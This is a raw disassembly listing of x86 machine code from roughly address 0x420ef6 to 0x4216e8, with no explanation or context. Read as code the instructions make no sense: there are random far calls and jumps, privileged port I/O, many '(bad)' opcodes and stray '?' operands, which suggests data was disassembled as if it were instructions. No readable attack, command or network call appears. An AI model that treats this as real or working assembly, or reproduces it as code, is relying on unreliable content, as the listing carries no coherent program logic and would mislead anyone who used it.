  420ef6:	jne    0x420f6e
  420ef8:	sub    DWORD PTR [edi-0x8],esi
  420efb:	mov    ebp,DWORD PTR [ebx+0x7b]
  420efe:	iret   
  420eff:	sbb    edx,DWORD PTR [ecx+0x250a9ee0]
  420f05:	adc    ebp,DWORD PTR [esi]
  420f07:	pop    es
  420f08:	xchg   edx,eax
  420f09:	adc    dl,bh
  420f0b:	jmp    0x420e9d
  420f0d:	test   DWORD PTR [edi],edx
  420f0f:	push   ebp
  420f10:	xor    ah,BYTE PTR [ecx+0x2b971005]
  420f16:	sbb    ecx,DWORD PTR [ebp+0x55973761]
  420f1c:	fistp  WORD PTR [ebx+esi*1+0x71eae06]
  420f23:	add    eax,0xa85348e8
  420f28:	in     al,0x48
  420f2a:	push   0xb80462dc
  420f2f:	jb     0x420f9f
  420f31:	mov    bl,0x3a
  420f33:	sbb    al,0xee
  420f35:	inc    eax
  420f36:	dec    eax
  420f37:	mov    ah,0xa3
  420f39:	adc    BYTE PTR [edi-0x47306c6],cl
  420f3f:	outs   dx,DWORD PTR ds:[esi]
  420f40:	cdq    
  420f41:	jl     0x420ef1
  420f43:	dec    eax
  420f44:	(bad)  [ebp-0x59]
  420f47:	pop    ds
  420f48:	loopne 0x420f89
  420f4a:	mov    BYTE PTR [ebx+ebx*2],0x7a
  420f4e:	cs cs in eax,0x91
  420f52:	push   ebp
  420f53:	pop    eax
  420f54:	out    0x4,al
  420f56:	ret    0x9f43
  420f59:	add    eax,0x7e2d2af4
  420f5e:	int    0x17
  420f60:	add    bl,cl
  420f62:	push   ds
  420f63:	stos   DWORD PTR es:[edi],eax
  420f64:	xchg   ebx,eax
  420f65:	push   edx
  420f66:	or     al,0x61
  420f68:	std    
  420f69:	mov    edx,0x3109b81f
  420f6e:	mov    ebx,0x1f19b3d1
  420f73:	(bad)  
  420f74:	enter  0x651f,0x86
  420f78:	in     al,dx
  420f79:	jns    0x420fdb
  420f7b:	into   
  420f7c:	out    0x40,eax
  420f7e:	jmp    DWORD PTR [edx]
  420f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f81:	and    eax,0xc1b0bd99
  420f86:	mov    cl,0xa3
  420f88:	repnz les eax,FWORD PTR [eax-0x60]
  420f8c:	or     al,0x4
  420f8e:	adc    BYTE PTR [ebp*2+0x1e07c38],ch
  420f95:	and    eax,0x7c37cfae
  420f9a:	mov    edi,0x6d79efac
  420f9f:	in     al,dx
  420fa0:	inc    ebp
  420fa1:	push   eax
  420fa2:	fcom   DWORD PTR [edx]
  420fa4:	adc    edi,DWORD PTR [esi]
  420fa6:	adc    al,0xa4
  420fa8:	jae    0x420f3f
  420faa:	add    esi,esi
  420fac:	std    
  420fad:	and    eax,0x43ec0911
  420fb2:	test   al,0x11
  420fb4:	inc    ebp
  420fb5:	cmp    BYTE PTR [esi+0x2c02f542],bh
  420fbb:	cwde   
  420fbc:	addr16 and al,0x4c
  420fbf:	xor    al,0x14
  420fc1:	xchg   esp,eax
  420fc2:	fcmovb st,st(2)
  420fc4:	(bad)  
  420fc5:	retf   0x6d0e
  420fc8:	adc    ah,al
  420fca:	ficom  DWORD PTR [ecx+edx*2+0x17c9fd14]
  420fd1:	push   esp
  420fd2:	pushf  
  420fd3:	jmp    0x421017
  420fd5:	shr    cl,cl
  420fd7:	test   eax,0x3693fb4
  420fdc:	pop    ss
  420fdd:	icebp  
  420fde:	idiv   DWORD PTR [ecx+0x16]
  420fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fe2:	pop    ecx
  420fe3:	cwde   
  420fe4:	pop    es
  420fe5:	nop
  420fe6:	rol    BYTE PTR [esp+edi*4-0x60ea794a],cl
  420fed:	enter  0xf203,0xfc
  420ff1:	push   ecx
  420ff2:	aaa    
  420ff3:	out    dx,eax
  420ff4:	loop   0x420fe5
  420ff6:	cs push ebx
  420ff8:	push   ds
  420ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ffa:	mov    ah,0x2c
  420ffc:	adc    esp,DWORD PTR [ecx+0x3e]
  420fff:	xchg   esi,eax
  421000:	repnz mov eax,ds:0xca264f3b
  421006:	lock jo 0x42102d
  421009:	xor    BYTE PTR [eax+0x3739eeb6],0x70
  421010:	jns    0x421023
  421012:	mov    ch,0xb5
  421014:	or     DWORD PTR [esi-0x41],0x8c6350bb
  42101b:	sub    DWORD PTR [ecx-0x554c142],esp
  421021:	xchg   DWORD PTR [edx-0x6eacf3ad],ecx
  421027:	pop    ecx
  421028:	popf   
  421029:	pop    eax
  42102a:	scas   al,BYTE PTR es:[edi]
  42102b:	mov    bh,0x49
  42102d:	sti    
  42102e:	push   ss
  42102f:	outs   dx,BYTE PTR ds:[esi]
  421030:	push   ds
  421031:	sar    BYTE PTR [ebx],1
  421033:	adc    al,0x9a
  421035:	je     0x42102c
  421037:	int3   
  421038:	mov    ebp,0x71b2e6da
  42103d:	xor    ah,BYTE PTR es:[edx]
  421040:	pop    esp
  421041:	pop    ebx
  421042:	lock mov DWORD PTR [edx-0x61b8fd1d],ebp
  421049:	or     al,BYTE PTR [ebp+0x7e08ee49]
  42104f:	push   0x55e555a7
  421054:	mov    dl,0xc5
  421056:	mov    bl,0x6a
  421058:	lods   eax,DWORD PTR ds:[esi]
  421059:	cwde   
  42105a:	mov    dh,BYTE PTR [eax-0x35b9c277]
  421060:	retf   0xbbe1
  421063:	or     eax,esi
  421065:	cmp    BYTE PTR [edx-0x1a],dh
  421068:	jl     0x4210a5
  42106a:	sbb    DWORD PTR [eax],0xc1924081
  421070:	mov    al,0xac
  421072:	and    al,0xb8
  421074:	mov    ebx,0xc6c27fa7
  421079:	std    
  42107a:	mov    gs,WORD PTR [edx]
  42107c:	mov    eax,ds:0x85ea2c85
  421081:	pop    ss
  421082:	ret    0x2d1d
  421085:	popf   
  421086:	and    eax,0x8ac459e1
  42108b:	into   
  42108c:	in     eax,0x55
  42108e:	loope  0x4210f8
  421090:	jae    0x4210f2
  421092:	jp     0x4210a9
  421094:	leave  
  421095:	cmp    BYTE PTR [ebp+0x44],dh
  421098:	rol    BYTE PTR [edi+ecx*4+0x0],0xe4
  42109d:	jmp    0xa7303128
  4210a2:	dec    esp
  4210a3:	cli    
  4210a4:	in     eax,dx
  4210a5:	jle    0x4210db
  4210a7:	sub    DWORD PTR [eax+0x6f],ebx
  4210aa:	mov    eax,0xd52f8228
  4210af:	adc    cl,ah
  4210b1:	push   ebp
  4210b2:	pop    ss
  4210b3:	scas   al,BYTE PTR es:[edi]
  4210b4:	and    eax,0xa432e66d
  4210b9:	jle    0x4210c0
  4210bb:	sbb    al,0x3a
  4210bd:	mov    ax,ds:0x875070c9
  4210c3:	mov    eax,DWORD PTR [eax]
	...
  4210d1:	dec    edx
  4210d2:	jo     0x4210ac
  4210d4:	jl     0x4210d0
  4210d6:	cld    
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	inc    ebp
  4210de:	push   ebx
  4210df:	mov    ebp,0x18a6f41
  4210e4:	add    BYTE PTR [ebx+0x2a000003],ch
  4210ea:	cmc    
  4210eb:	inc    edx
  4210ec:	mov    cl,0xf7
  4210ee:	adc    eax,0xbe126eb0
  4210f3:	shl    DWORD PTR [edx+ebx*4],0xda
  4210f7:	out    0xf3,eax
  4210f9:	ds and al,0xcc
  4210fc:	xchg   edi,eax
  4210fd:	ja     0x4210eb
  4210ff:	lds    ebx,FWORD PTR [eax-0x48]
  421102:	sbb    eax,0xa6513361
  421107:	data16 out 0x20,al
  42110a:	in     al,dx
  42110b:	cmp    bl,cl
  42110d:	jmp    0x421098
  42110f:	add    ah,ah
  421111:	cwde   
  421112:	cmp    eax,0x6099989a
  421117:	ds test eax,0x9e7069c7
  42111d:	es stc 
  42111f:	add    BYTE PTR [ebp-0x65],ch
  421122:	sub    al,0x63
  421124:	lds    esi,FWORD PTR [edx+0x794daf8a]
  42112a:	and    ecx,DWORD PTR [edi+ebx*1+0xf]
  42112e:	mov    gs,WORD PTR [edx]
  421130:	enter  0x2a9c,0x69
  421134:	and    esp,DWORD PTR [eax]
  421136:	push   ebp
  421137:	push   ebx
  421138:	fmul   QWORD PTR [esi-0x5c]
  42113b:	and    eax,0x46b3e28b
  421140:	xor    esp,0xbdd73007
  421146:	in     eax,dx
  421147:	mov    esp,0xf85bdad1
  42114c:	lea    edi,[edi]
  42114e:	in     eax,0x2f
  421150:	js     0x421179
  421152:	clc    
  421153:	cmc    
  421154:	je     0x421198
  421156:	push   esp
  421157:	push   edi
  421158:	std    
  421159:	and    eax,DWORD PTR [edi]
  42115b:	nop
  42115c:	adc    ch,BYTE PTR [edi-0x64d652c8]
  421162:	add    bl,BYTE PTR [esi+0x30]
  421165:	ror    BYTE PTR [eax+0x79ca525e],1
  42116b:	aas    
  42116c:	int3   
  42116d:	lds    edi,FWORD PTR [ecx]
  42116f:	jg     0x4211c0
  421171:	pop    edi
  421172:	push   ebx
  421173:	mov    ds:0xc98ddac8,al
  421178:	test   al,0x5a
  42117a:	iret   
  42117b:	repnz sti 
  42117d:	div    BYTE PTR [edx+edi*4+0x3fc53cde]
  421184:	fdiv   st,st(7)
  421186:	enter  0x5a4,0xf0
  42118a:	jns    0x421167
  42118c:	lea    ebp,[eax+0x40a1e5ef]
  421192:	or     al,0x87
  421194:	mov    ebp,0xe542ee33
  421199:	mov    dh,0x1a
  42119b:	sbb    ch,BYTE PTR [edi-0x1d109e2e]
  4211a1:	jl     0x4211ab
  4211a3:	pop    ebp
  4211a4:	dec    eax
  4211a5:	or     eax,0x309a83b4
  4211aa:	cmp    dh,al
  4211ac:	lds    edx,FWORD PTR [edi+edx*1-0x1d]
  4211b0:	lahf   
  4211b1:	cmc    
  4211b2:	mov    edi,0xab700e67
  4211b7:	retf   
  4211b8:	lods   al,BYTE PTR ds:[esi]
  4211b9:	sub    edx,DWORD PTR [ecx]
  4211bb:	call   0x5679:0x31d1a710
  4211c2:	jmp    0xc05b2073
  4211c7:	xchg   ebx,eax
  4211c8:	add    bl,ah
  4211ca:	in     al,0x2d
  4211cc:	div    BYTE PTR [ebx+0x5ed6037]
  4211d2:	jmp    0x2afe3dac
  4211d7:	cmp    bh,dl
  4211d9:	pop    ds
  4211da:	(bad)  
  4211db:	cmp    ax,0xe974
  4211df:	xchg   esp,eax
  4211e0:	dec    esi
  4211e1:	ficom  WORD PTR [edi+0x5d9dc1ff]
  4211e7:	push   edx
  4211e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211e9:	cmc    
  4211ea:	in     eax,dx
  4211eb:	(bad)  
  4211ec:	ror    cl,1
  4211ee:	sub    al,0x99
  4211f0:	jge    0x421199
  4211f2:	sar    BYTE PTR [ebx+0x34],1
  4211f5:	sub    al,0x9e
  4211f7:	in     eax,dx
  4211f8:	and    DWORD PTR [edi],edi
  4211fa:	push   esi
  4211fb:	mov    eax,0x71bf926a
  421200:	and    eax,0xb4b84537
  421205:	dec    esp
  421206:	and    al,0x83
  421208:	(bad)  
  421209:	push   ds
  42120a:	fisttp QWORD PTR [ecx-0x52]
  42120d:	xchg   ecx,eax
  42120e:	sbb    BYTE PTR [edx+ebp*4],ch
  421211:	jnp    0x42127b
  421213:	popa   
  421214:	stc    
  421215:	fstp   QWORD PTR [esi-0x45]
  421218:	retf   0xed22
  42121b:	pop    es
  42121c:	fs inc ecx
  42121e:	xchg   edi,eax
  42121f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421220:	ds loop 0x421291
  421223:	inc    eax
  421224:	mov    fs,esi
  421226:	lds    ebx,FWORD PTR [edi]
  421228:	sar    BYTE PTR [eax-0x66dfd4bc],0xb8
  42122f:	inc    ecx
  421230:	mov    ch,dh
  421232:	lods   al,BYTE PTR ds:[esi]
  421233:	mov    ah,0xb1
  421235:	ja     0x421223
  421237:	out    dx,al
  421238:	lds    ecx,FWORD PTR [eax-0x685e3af3]
  42123e:	adc    dl,bl
  421240:	mov    eax,0xa1d8aa00
  421245:	adc    BYTE PTR [ecx-0x5c],0x35
  421249:	test   al,dh
  42124b:	mov    BYTE PTR [ecx+edi*8+0x7dd488db],ah
  421252:	inc    eax
  421253:	xchg   edi,eax
  421254:	fs add ecx,ebp
  421257:	dec    esi
  421258:	jo     0x421287
  42125a:	in     al,0xb
  42125c:	xchg   ecx,eax
  42125d:	aad    0xc1
  42125f:	stc    
  421260:	push   eax
  421261:	jg     0x4212a0
  421263:	and    ah,dh
  421265:	out    dx,eax
  421266:	jge    0x421240
  421268:	leave  
  421269:	sbb    DWORD PTR [eax-0x62],ebp
  42126c:	out    0xc3,al
  42126e:	sub    BYTE PTR [ebx-0x37886d23],0x38
  421275:	dec    ebx
  421276:	push   ebx
  421277:	adc    al,0xdd
  421279:	adc    dh,cl
  42127b:	pop    ss
  42127c:	ss cmp eax,0xde0b888d
  421282:	push   ebx
  421283:	cli    
  421284:	jg     0x4212c5
  421286:	push   esp
  421287:	(bad)  
  421288:	dec    ebx
  421289:	mov    eax,ds:0xfa816961
  42128e:	lods   eax,DWORD PTR ds:[esi]
  42128f:	push   cs
  421290:	cwde   
  421291:	gs mov ah,0x32
  421294:	dec    ebp
  421295:	push   ss
  421296:	sbb    bh,al
  421298:	add    ch,BYTE PTR [edx]
  42129a:	dec    esi
  42129b:	sub    al,0xfd
  42129d:	in     al,dx
  42129e:	or     eax,0xe8fdfc89
  4212a3:	shl    BYTE PTR [ebp+0x10],0x95
  4212a7:	out    dx,al
  4212a8:	push   edi
  4212a9:	jg     0x4212ed
  4212ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ac:	fwait
  4212ad:	in     al,0x46
  4212af:	xchg   esi,eax
  4212b0:	jnp    0x421310
  4212b2:	pop    eax
  4212b3:	xchg   ebp,eax
  4212b4:	and    bh,dl
  4212b6:	lods   eax,DWORD PTR ds:[esi]
  4212b7:	push   esp
  4212b8:	icebp  
  4212b9:	aaa    
  4212ba:	data16 and bl,BYTE PTR [eax+edi*2-0x4c9ca5a4]
  4212c2:	sub    BYTE PTR [eax],bh
  4212c4:	js     0x42129c
  4212c6:	xchg   BYTE PTR [ecx+0x52],al
  4212c9:	inc    ebx
  4212ca:	rcl    ah,1
  4212cc:	adc    eax,DWORD PTR [eax-0x22]
  4212cf:	mov    cl,dh
  4212d1:	(bad)  
  4212d2:	ficomp DWORD PTR [edi+0x489ccf58]
  4212d8:	outs   dx,DWORD PTR ds:[esi]
  4212d9:	cdq    
  4212da:	cmp    BYTE PTR [ebx-0x5],dh
  4212dd:	(bad)  
  4212de:	dec    esp
  4212df:	pop    ebx
  4212e0:	add    eax,0x3014e8cb
  4212e5:	adc    eax,0xc8c3a1b4
  4212ea:	fnstcw WORD PTR [eax-0x6e6cc7f6]
  4212f0:	es pop esp
  4212f2:	cmp    DWORD PTR [ecx+0x17],0x63ef9594
  4212f9:	or     dh,BYTE PTR [edx]
  4212fb:	mov    cs,WORD PTR [edi+eax*2+0x23]
  4212ff:	fucom  st(6)
  421301:	jae    0x421370
  421303:	out    0x8b,al
  421305:	mov    DWORD PTR [ebx-0x4],ecx
  421308:	xor    DWORD PTR [ebp+0x5],esp
  42130b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42130c:	dec    edx
  42130d:	fcomip st,st(3)
  42130f:	push   ecx
  421310:	push   ebp
  421311:	xorps  xmm6,XMMWORD PTR [ebp-0x66b3676b]
  421318:	je     0x4212f1
  42131a:	xchg   edx,eax
  42131b:	pop    ds
  42131c:	jns    0x42133e
  42131e:	adc    cl,al
  421320:	enter  0x56b4,0x69
  421324:	xor    DWORD PTR [edi+0x1b],ecx
  421327:	mov    ds:0xd0b13e56,eax
  42132c:	xchg   esp,eax
  42132d:	push   ds
  42132e:	push   cs
  42132f:	add    eax,edx
  421331:	or     DWORD PTR [ebx+0x2e],eax
  421334:	je     0x42135e
  421336:	jg     0x421374
  421338:	jg     0x421300
  42133a:	mov    cl,0x6a
  42133c:	outs   dx,BYTE PTR ds:[esi]
  42133d:	(bad)  
  42133e:	stos   DWORD PTR es:[edi],eax
  42133f:	push   cs
  421340:	add    BYTE PTR [eax-0x35],0xc2
  421344:	mov    ds:0xe726516a,eax
  421349:	mov    dh,0x63
  42134b:	sar    BYTE PTR [esi],1
  42134d:	sbb    DWORD PTR ds:0x6be8a077,ebx
  421353:	fwait
  421354:	push   ebx
  421355:	fwait
  421356:	outs   dx,BYTE PTR ds:[esi]
  421357:	sub    bl,BYTE PTR [ecx]
  421359:	div    BYTE PTR [ecx-0x21cb5d20]
  42135f:	or     esi,edx
  421361:	sub    esp,esi
  421363:	xchg   ecx,eax
  421364:	outs   dx,BYTE PTR ds:[esi]
  421365:	jb     0x421375
  421367:	das    
  421368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421369:	xchg   esi,eax
  42136a:	(bad)  
  42136b:	sub    eax,0x17541594
  421370:	aaa    
  421371:	iret   
  421372:	jge    0x4213d0
  421374:	inc    DWORD PTR [ecx*4+0x5560fb45]
  42137b:	sbb    BYTE PTR [esi+ebx*8],bl
  42137e:	sub    eax,0xb866c216
  421383:	xor    BYTE PTR [edx+0x2266c86d],ch
  421389:	mov    es,esi
  42138b:	pop    esi
  42138c:	sub    dh,BYTE PTR [eax+edx*2+0x8]
  421390:	imul   dh
  421392:	adc    cl,ch
  421394:	or     BYTE PTR [edi],dh
  421396:	add    eax,0xb561bd74
  42139b:	mov    ebx,0x18e91e34
  4213a0:	sti    
  4213a1:	mov    ?,WORD PTR [esi+0x66b768b3]
  4213a7:	push   edi
  4213a8:	xchg   ecx,eax
  4213a9:	push   es
  4213aa:	xchg   esi,eax
  4213ab:	and    ah,BYTE PTR ds:0x31e3a5c
  4213b1:	xor    cl,dh
  4213b3:	xchg   edx,eax
  4213b4:	loop   0x42133b
  4213b6:	jae    0x421437
  4213b8:	mov    edi,0x32d3a916
  4213bd:	mov    cl,0x8f
  4213bf:	loope  0x42139e
  4213c1:	aas    
  4213c2:	bound  edx,QWORD PTR ds:0x6f75c0a4
  4213c8:	push   ebx
  4213c9:	pop    ds
  4213ca:	sub    al,0x66
  4213cc:	and    cl,BYTE PTR ds:0xa3e03c28
  4213d2:	dec    BYTE PTR [edx+eax*2]
  4213d5:	add    DWORD PTR [eax+0x3500e38d],ebx
  4213db:	pusha  
  4213dc:	xchg   esi,ecx
  4213de:	bound  ecx,QWORD PTR [edx+edi*1]
  4213e1:	ins    BYTE PTR es:[edi],dx
  4213e2:	mov    bl,BYTE PTR [ecx]
  4213e4:	add    DWORD PTR [ebx],ebp
  4213e6:	push   ss
  4213e7:	neg    DWORD PTR [ebp-0x411f6885]
  4213ed:	in     eax,dx
  4213ee:	mov    ecx,DWORD PTR [ebx]
  4213f0:	inc    ecx
  4213f1:	mov    ch,al
  4213f3:	call   0xb2a8:0xc6a45648
  4213fa:	scas   eax,DWORD PTR es:[edi]
  4213fb:	push   ss
  4213fc:	iret   
  4213fd:	push   esi
  4213fe:	and    edi,DWORD PTR [ebp-0x2b834e94]
  421404:	loope  0x4213ec
  421406:	add    al,0xa3
  421408:	out    dx,al
  421409:	les    ebp,FWORD PTR [esi-0xe2ff536]
  42140f:	ficomp WORD PTR [edx]
  421411:	jo     0x4213f5
  421413:	ds jp  0x42147d
  421416:	mov    esi,?
  421418:	or     BYTE PTR [eax+0x3280d842],0x52
  42141f:	sub    DWORD PTR [edx+0x50],0xffffff8e
  421423:	and    BYTE PTR [esi+0x67],dl
  421426:	mov    esp,0xb60e6e92
  42142b:	cmp    ah,BYTE PTR [eax]
  42142d:	in     eax,0xa5
  42142f:	add    al,0xe7
  421431:	jne    0x42148b
  421433:	(bad)  
  421434:	iret   
  421435:	sti    
  421436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421437:	jo     0x42145f
  421439:	mov    esp,DWORD PTR [ecx-0x54]
  42143c:	mov    al,0x34
  42143e:	je     0x421424
  421440:	dec    ecx
  421441:	inc    ebp
  421442:	xor    eax,0xe8b69956
  421447:	in     al,dx
  421448:	(bad)  
  421449:	dec    ebp
  42144a:	call   0x1a0b:0x76728a60
  421451:	jno    0x4213e7
  421453:	(bad)  
  421454:	push   ss
  421455:	push   ebx
  421456:	jmp    0x50016a56
  42145b:	das    
  42145c:	fst    DWORD PTR [eax-0x53]
  42145f:	or     dl,al
  421461:	jmp    0x4503:0xcc245e73
  421468:	jmp    0x421479
  42146a:	adc    ah,dl
  42146c:	mov    al,0xab
  42146e:	fadd   DWORD PTR [ebp+0x79b68465]
  421474:	ret    0x2ca1
  421477:	xor    al,bl
  421479:	mov    eax,0xf3807a14
  42147e:	in     al,0x5
  421480:	test   DWORD PTR [ebx],ebx
  421482:	adc    eax,0x3a
  421485:	call   0x35ad:0xd149775a
  42148c:	and    al,0x54
  42148e:	mov    ds:0x35a00dfc,eax
	...
  4214a0:	add    BYTE PTR [ebp-0x2c737c23],cl
  4214a6:	fimul  WORD PTR [edi-0x66af6223]
  4214ac:	daa    
  4214ad:	mul    BYTE PTR [esp+eiz*2+0x72]
  4214b1:	sbb    cl,BYTE PTR [esi+0x3ab0001]
  4214b7:	add    BYTE PTR [eax],al
  4214b9:	pop    ds
  4214ba:	push   esi
  4214bb:	xor    al,0x74
  4214bd:	ss inc ecx
  4214bf:	loop   0x4214da
  4214c1:	popa   
  4214c2:	mov    cl,0x74
  4214c4:	ror    DWORD PTR [ecx+0x7841f1f2],1
  4214ca:	sbb    BYTE PTR [ebx+0x30],bh
  4214cd:	jge    0x421460
  4214cf:	push   0xa2b91681
  4214d4:	test   al,0x8e
  4214d6:	scas   al,BYTE PTR es:[edi]
  4214d7:	shr    ecx,cl
  4214d9:	fld    QWORD PTR [ecx+0x57]
  4214dc:	loop   0x4214c3
  4214de:	fild   QWORD PTR [ebx+0x3]
  4214e1:	lods   eax,DWORD PTR ds:[esi]
  4214e2:	loope  0x42150b
  4214e4:	inc    ecx
  4214e5:	call   0xa2e43ca1
  4214ea:	xchg   ecx,eax
  4214eb:	outs   dx,DWORD PTR ds:[esi]
  4214ec:	jmp    FWORD PTR [eax]
  4214ee:	outs   dx,BYTE PTR ds:[esi]
  4214ef:	cmc    
  4214f0:	xor    ebx,ecx
  4214f2:	jecxz  0x421515
  4214f4:	in     eax,dx
  4214f5:	mov    edx,0x4a1ebb7b
  4214fa:	pop    es
  4214fb:	mov    esi,0x37f29d0e
  421500:	push   0x2d
  421502:	cmp    BYTE PTR [ecx+0x69f3529d],0x4d
  421509:	push   cs
  42150a:	sti    
  42150b:	ret    0x1755
  42150e:	push   ecx
  42150f:	scas   al,BYTE PTR es:[edi]
  421510:	inc    edx
  421511:	bound  ebx,QWORD PTR es:[edi-0x388b5e5]
  421518:	enter  0x85c7,0xbd
  42151c:	add    ebp,DWORD PTR [esi-0x29]
  42151f:	pushf  
  421520:	loope  0x42158a
  421522:	fdivp  st(2),st
  421524:	seto   BYTE PTR [edx]
  421527:	or     al,0x5
  421529:	test   DWORD PTR [ecx+eiz*2],0x562dfb82
  421530:	lods   al,BYTE PTR ds:[esi]
  421531:	(bad)  
  421532:	mov    al,ds:0xfe1cb277
  421537:	mov    ecx,0xeadacb14
  42153c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42153e:	bnd jnp 0x4215b7
  421541:	(bad)  
  421542:	int3   
  421543:	xchg   esi,eax
  421544:	mov    edx,0x4e0d6e09
  421549:	out    dx,eax
  42154a:	mov    dh,0xed
  42154c:	loopne 0x4214fd
  42154e:	pop    es
  42154f:	sti    
  421550:	retf   
  421551:	jp     0x4214f8
  421553:	adc    edx,DWORD PTR [ebp+eax*1+0x57a12196]
  42155a:	sar    DWORD PTR [ebp-0x4e],1
  42155d:	pop    ss
  42155e:	adc    bl,BYTE PTR [edi-0x37]
  421561:	leave  
  421562:	jnp    0x421597
  421564:	rol    BYTE PTR [eax],1
  421566:	enter  0x8499,0x57
  42156a:	call   0xc63f:0x8cf6d6f6
  421571:	inc    ebp
  421572:	aaa    
  421573:	dec    esp
  421574:	add    BYTE PTR [ebx+0x73e40d66],ah
  42157a:	lods   eax,DWORD PTR ds:[esi]
  42157b:	frstor [ebx-0x28875071]
  421581:	and    eax,0x953772fd
  421586:	mov    ebp,0x3c4671ec
  42158b:	fbstp  TBYTE PTR [edi-0x557a030a]
  421591:	mov    dl,0x8e
  421593:	pop    ebp
  421594:	repz and DWORD PTR [ecx+0x42bd3e62],esi
  42159b:	gs leave 
  42159d:	xor    eax,DWORD PTR ss:[ecx+esi*1]
  4215a1:	sub    eax,0x93e53059
  4215a6:	icebp  
  4215a7:	mov    eax,0xb2bef64d
  4215ac:	into   
  4215ad:	mov    esp,0xabe80862
  4215b2:	lods   eax,DWORD PTR ds:[esi]
  4215b3:	ss into 
  4215b5:	fistp  DWORD PTR [eax+eiz*1]
  4215b8:	cmp    DWORD PTR [eax-0x58],ecx
  4215bb:	xor    ecx,ebx
  4215bd:	call   0xc2c8:0xe2be4c2b
  4215c4:	fwait
  4215c5:	popf   
  4215c6:	mov    al,ds:0xd5ec2bb7
  4215cb:	xor    eax,0xabc2563b
  4215d0:	ins    DWORD PTR es:[edi],dx
  4215d1:	cwde   
  4215d2:	popa   
  4215d3:	mov    BYTE PTR [eax+0x9bf746c],bl
  4215d9:	or     BYTE PTR [ebp+ebx*8-0x41],bl
  4215dd:	gs inc eax
  4215df:	cli    
  4215e0:	sbb    DWORD PTR [ebp-0x35],ebx
  4215e3:	adc    DWORD PTR [edx+edx*4],ebx
  4215e6:	out    dx,eax
  4215e7:	in     eax,0x1f
  4215e9:	sti    
  4215ea:	xchg   esp,eax
  4215eb:	jns    0x4215f3
  4215ed:	adc    edx,DWORD PTR [edi-0x34799e86]
  4215f3:	push   ss
  4215f4:	pop    eax
  4215f5:	jmp    0x4215a0
  4215f7:	sbb    al,0x6b
  4215f9:	push   eax
  4215fa:	jl     0x42166d
  4215fc:	std    
  4215fd:	lods   eax,DWORD PTR ds:[esi]
  4215fe:	mov    bl,0xcb
  421600:	pop    esi
  421601:	push   eax
  421602:	je     0x421594
  421604:	add    DWORD PTR [eax],esi
  421606:	mov    cl,0xb8
  421608:	outs   dx,BYTE PTR ds:[esi]
  421609:	push   edi
  42160a:	aas    
  42160b:	cmpxchg8b QWORD PTR [ecx+0x1a]
  42160f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421610:	adc    DWORD PTR [ecx],ebx
  421612:	and    ah,BYTE PTR [ecx+0x11aa3360]
  421618:	out    0x26,al
  42161a:	mov    cs,WORD PTR [ebx+0x3cb74a03]
  421620:	xor    eax,0x40c5685c
  421625:	sub    DWORD PTR [ecx],esp
  421627:	loopne 0x4215e3
  421629:	dec    eax
  42162a:	lods   eax,DWORD PTR ds:[esi]
  42162b:	or     dl,BYTE PTR [ebx+0x5096de64]
  421631:	add    DWORD PTR [esi+0x436fd267],eax
  421637:	adc    eax,0x362d71fb
  42163c:	fdiv   st,st(7)
  42163e:	loope  0x4216b4
  421640:	scas   al,BYTE PTR es:[edi]
  421641:	in     eax,dx
  421642:	sub    bl,BYTE PTR [ecx-0x5a411dfc]
  421648:	mov    ch,BYTE PTR [edx-0x1123f50a]
  42164e:	scas   eax,DWORD PTR es:[edi]
  42164f:	jecxz  0x421626
  421651:	xor    ah,al
  421653:	cdq    
  421654:	test   edx,edi
  421656:	mov    BYTE PTR [ebx],al
  421658:	test   BYTE PTR [esi+ebp*2-0x71],ch
  42165c:	pop    ecx
  42165d:	jmp    DWORD PTR [edi-0x4e707d82]
  421663:	rcl    BYTE PTR [edx],cl
  421665:	mov    ebp,edi
  421667:	cld    
  421668:	shl    DWORD PTR [eax],cl
  42166a:	or     dh,BYTE PTR [ecx+0x36d5b0ef]
  421670:	jne    0x4216bf
  421672:	outs   dx,BYTE PTR ds:[esi]
  421673:	xchg   BYTE PTR [ebx*4+0x43399116],bl
  42167a:	sbb    bh,dh
  42167c:	pop    es
  42167d:	jbe    0x421638
  42167f:	push   ebx
  421680:	push   0x55
  421682:	std    
  421683:	into   
  421684:	jo     0x42162b
  421686:	xchg   DWORD PTR [ecx],edi
  421688:	pop    ds
  421689:	call   0x4f1c:0xb8d01ea4
  421690:	popf   
  421691:	repz and bh,BYTE PTR [ecx-0x48]
  421695:	fcom   DWORD PTR [edx-0x46d1646b]
  42169b:	mov    edi,0x2448e908
  4216a0:	cmp    eax,0x88f0d6a6
  4216a5:	lods   eax,DWORD PTR ds:[esi]
  4216a6:	sbb    eax,0xece105ea
  4216ab:	xor    bl,BYTE PTR ds:0xef551aff
  4216b1:	mov    dl,0xbb
  4216b3:	mov    edx,0x18c7de0a
  4216b8:	dec    ebx
  4216b9:	push   ecx
  4216ba:	(bad)  
  4216bb:	rcl    DWORD PTR gs:[edx+0x41],0xbe
  4216c0:	jecxz  0x421730
  4216c2:	inc    ebp
  4216c3:	mov    cs,WORD PTR [edi+0x17]
  4216c6:	cdq    
  4216c7:	push   esp
  4216c8:	cmp    eax,0x4c9986c0
  4216cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216ce:	pop    ecx
  4216cf:	or     esp,esi
  4216d1:	pop    ss
  4216d2:	std    
  4216d3:	cwd    
  4216d5:	inc    esi
  4216d6:	leave  
  4216d7:	lods   eax,DWORD PTR ds:[esi]
  4216d8:	scas   al,BYTE PTR es:[edi]
  4216d9:	lock jle 0x421708
  4216dc:	sbb    ch,ah
  4216de:	adc    ah,BYTE PTR [eax]
  4216e0:	bound  esi,QWORD PTR [edi]
  4216e2:	je     0x421694
  4216e4:	out    0xb1,al
  4216e6:	mov    bh,0x27
  4216e8:	(bad)  
